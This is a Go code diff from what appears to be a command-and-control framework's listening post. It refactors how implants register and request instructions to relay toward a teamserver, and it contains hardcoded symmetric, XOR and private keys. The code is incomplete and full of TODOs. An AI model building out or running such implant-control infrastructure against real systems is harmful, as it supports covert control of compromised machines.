@@ -19,9 +19,9 @@ import (
 func makeManifest(componentId string) component.ComponentManifest {
 	var generatedManifest component.ComponentManifest
 	platInfo := uname.GetUname()
-	generatedManifest.Lp_hostname = platInfo.Uname.Nodename
-	generatedManifest.Lp_id = componentId
-	generatedManifest.Lp_os = platInfo.Uname.Sysname
+	generatedManifest.Hostname = platInfo.Uname.Nodename
+	generatedManifest.Id = componentId
+	generatedManifest.Os = platInfo.Uname.Sysname
 	return generatedManifest
 }
 
@@ -58,27 +58,40 @@ sym_key = BvjTA1o55UmZnuTy
 xor_key = 0x6d
 priv_key = jnbl37d67g656d617b19l6l02305g68l4d03ngn914800934511b2g13bgdg1021`)
 	Component := genComponentInfo(lpConfig)
+	// This is the start of the registration process for a client
+	// TODO: This is a loop per implant
+	var client transport.RegisteredComponent
+	var err error
 	transportWg := sync.WaitGroup{}
 	defer transportWg.Wait()
-	transport, _, err := transport.PrepareTransport(&Component, []string{})
+	client.Transport, _, err = transport.PrepareTransport(&Component, []string{})
 	if err != nil {
 		log.Fatalln("transport failed to initalize: ", err)
 	}
-	// TODO: This is a loop per implant
-	Component.CmdChannel = make(chan []byte)
-	initAckInstruction, client, boolSuccess := transaction.RetrieveInitFrame(&Component, transport)
+
+	client.InitalKeyPair = Component.InitalKeypair
+	client.InitalPubKey = Component.CurrentImpPubkey // find a better way to do this
+	client.CurKeyPair = client.InitalKeyPair
+	client.CurPubKey = client.InitalPubKey
+	client.XorKey = Component.XorKey
+	client.TskChkTimer = Component.Config.TskChkTimer
+	client.InitSignature = Component.Config.InitSignature
+	client.SelfComponentId = Component.ComponentId
+
+	// This client is now considered registe
+	initAckInstruction, client, boolSuccess := transaction.RetrieveInitFrame(&client)
 	if !boolSuccess {
 		log.Println("implant failed to initalize")
 		// TODO: Restart loop here
 	}
-	transaction.RelayInitFrame(&Component, initAckInstruction, transport)
-	// TODO: Register the client here
+	transaction.RelayInitFrame(&client, initAckInstruction)
+	// TODO: Client is now considered registerd
 	log.Println(client)
 
 	// TODO: Implement loop here to do the actual stuff
 	//  as an LP, we are awaiting a request for a command from an implant, which is then relayed to TS, where we get a command etc
 	for {
-		instructionRequestFrame, err := transaction.RetrieveInstructionRequest(&Component, &client)
+		instructionRequestFrame, err := transaction.RetrieveInstructionRequest(&client) // Depending if we have something in the Queue for this implant, we'll relay an instruction
 		if err != nil {
 			log.Println("invalid instruction received: ")
 			log.Println("[dbginstructframe]: ", instructionRequestFrame)
@@ -86,7 +99,9 @@ priv_key = jnbl37d67g656d617b19l6l02305g68l4d03ngn914800934511b2g13bgdg1021`)
 			time.Sleep(time.Duration(Component.Config.TskChkTimer))
 			break
 		}
+		// TODO: Teamserver interaction function
 		// serverCmd := transaction.RelayInstructionToServer
-
+		time.Sleep(time.Duration(Component.Config.TskChkTimer))
+		break
 	}
 }
